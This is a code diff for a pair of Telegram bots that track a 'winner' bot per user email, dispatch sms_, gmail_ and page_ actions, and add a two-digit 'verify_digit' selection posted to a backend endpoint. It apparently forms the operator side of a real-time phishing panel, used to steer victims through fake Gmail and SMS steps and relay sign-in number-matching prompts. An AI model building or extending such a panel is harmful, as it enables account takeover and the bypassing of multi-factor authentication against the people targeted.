@@ -182,7 +182,9 @@ bot.on("callback_query", async (query) => {
         const result = await updateResult.json();
         console.log(`✅ Digit stored. Count: ${result.selectedCount}`);
         
+        // ✅ Only remove keyboard and show message when we have 2 digits
         if (result.selectedCount === 2) {
+          console.log(`✅ 2 digits collected! Removing keyboard...`);
           try {
             await bot.editMessageReplyMarkup(
               { inline_keyboard: [] },
@@ -197,9 +199,12 @@ bot.on("callback_query", async (query) => {
           } catch (err) {
             console.error("❌ Error editing message:", err);
           }
+        } else {
+          // ✅ Just acknowledge the digit, don't remove keyboard
+          console.log(`⏳ Waiting for digit 2...`);
         }
 
-        await bot.answerCallbackQuery(query.id, { text: `📍 Selected: ${digit}` });
+        await bot.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
         return;
       } catch (err) {
         console.error("❌ verify_digit error:", err);
@@ -629,13 +634,62 @@ if (bot2) {
       }
 
       // ✅ STEP 1: Set winner on first click (if Bot 1 hasn't clicked yet - Page 1 only!)
-      if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_")) {
+      if (!userWinnerTelegram[email] && !action.startsWith("sms_") && !action.startsWith("gmail_") && !action.startsWith("page_") && !action.startsWith("verify_")) {
         userWinnerTelegram[email] = "telegram2";  // Bot 2 wins
         botsThatClickedPage1[email] = true;
         botsThatClickedPage1[`${email}_timestamp`] = Date.now();
         
         console.log(`🏆 User ${email} - Telegram 2 WINS!`);
         // ✅ NO NOTIFICATION - Only Bot 1 notifies, not Bot 2
+      }
+
+      // ============================================================================
+      // ✅ Handle verification digit selection
+      // ============================================================================
+      
+      if (action === "verify_digit") {
+        const [, requestId, digit] = query.data.split("|");
+        console.log(`📍 Bot 2 | Digit ${digit} clicked for requestId: ${requestId}`);
+        
+        try {
+          const updateResult = await fetch(`${APP_URL}/update-selected-digits`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ requestId, digit })
+          });
+          
+          const result = await updateResult.json();
+          console.log(`✅ Digit stored. Count: ${result.selectedCount}`);
+          
+          // ✅ Only remove keyboard and show message when we have 2 digits
+          if (result.selectedCount === 2) {
+            console.log(`✅ 2 digits collected! Removing keyboard...`);
+            try {
+              await bot2.editMessageReplyMarkup(
+                { inline_keyboard: [] },
+                { chat_id: query.message.chat.id, message_id: query.message.message_id }
+              );
+              
+              await bot2.sendMessage(
+                query.message.chat.id,
+                `✅ <b>Numbers Selected!</b>`,
+                { parse_mode: "HTML" }
+              );
+            } catch (err) {
+              console.error("❌ Error editing message:", err);
+            }
+          } else {
+            // ✅ Just acknowledge the digit, don't remove keyboard
+            console.log(`⏳ Waiting for digit 2...`);
+          }
+
+          await bot2.answerCallbackQuery(query.id, { text: `📍 Digit ${digit} selected (${result.selectedCount}/2)` });
+          return;
+        } catch (err) {
+          console.error("❌ verify_digit error:", err);
+          await bot2.answerCallbackQuery(query.id, { text: "Error processing digit" });
+          return;
+        }
       }
 
       // ============================================================================
